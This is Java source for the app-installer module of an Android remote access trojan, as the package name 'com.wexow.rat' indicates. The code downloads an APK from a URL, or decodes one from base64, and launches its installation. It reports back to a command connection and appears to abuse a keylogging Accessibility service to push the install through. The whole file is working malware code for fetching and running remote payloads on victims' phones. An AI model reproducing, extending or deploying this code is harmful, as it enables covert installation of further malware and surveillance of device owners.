package com.wexow.rat.managers;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.FileProvider;

import com.wexow.rat.core.ConnectionManager;
import com.wexow.rat.KeylogManager;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;

public class AppInstaller {
    private static final String TAG = "AppInstaller";

    public static void installFromBase64(Context ctx, String base64Data, String fileName) {
        new Thread(() -> {
            try {
                File apkFile = new File(ctx.getExternalFilesDir(null), fileName);
                byte[] data = Base64.decode(base64Data, Base64.NO_WRAP);
                FileOutputStream fos = new FileOutputStream(apkFile);
                fos.write(data);
                fos.close();

                installApk(ctx, apkFile);

                JSONObject res = new JSONObject();
                res.put("type", "install_started");
                res.put("file", fileName);
                res.put("size", data.length);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
                Log.e(TAG, "installFromBase64: " + e.getMessage());
            }
        }).start();
    }

    public static void installFromUrl(Context ctx, String url, String fileName) {
        new Thread(() -> {
            try {
                java.net.URL u = new java.net.URL(url);
                java.net.HttpURLConnection conn =
                    (java.net.HttpURLConnection) u.openConnection();
                conn.connect();

                File apkFile = new File(ctx.getExternalFilesDir(null), fileName);
                java.io.InputStream is = conn.getInputStream();
                FileOutputStream fos = new FileOutputStream(apkFile);

                byte[] buffer = new byte[8192];
                int read;
                long total = 0;
                while ((read = is.read(buffer)) != -1) {
                    fos.write(buffer, 0, read);
                    total += read;
                }
                fos.close();
                is.close();

                installApk(ctx, apkFile);
            } catch (Exception e) {
                Log.e(TAG, "installFromUrl: " + e.getMessage());
            }
        }).start();
    }

    private static void installApk(Context ctx, File apkFile) {
    try {
        Intent intent = new Intent(Intent.ACTION_VIEW);
        Uri apkUri = FileProvider.getUriForFile(ctx,
            ctx.getPackageName() + ".fileprovider", apkFile);
        intent.setDataAndType(apkUri,
            "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        
        if (KeylogManager.getInstance() != null) {
            Log.e(TAG, "✅ Using Accessibility to install");
            KeylogManager.getInstance().startActivity(intent);
        } else {
            ctx.startActivity(intent);
        }
    } catch (Exception e) {
        Log.e(TAG, "❌ installApk: " + e.getMessage());
    }
}

}
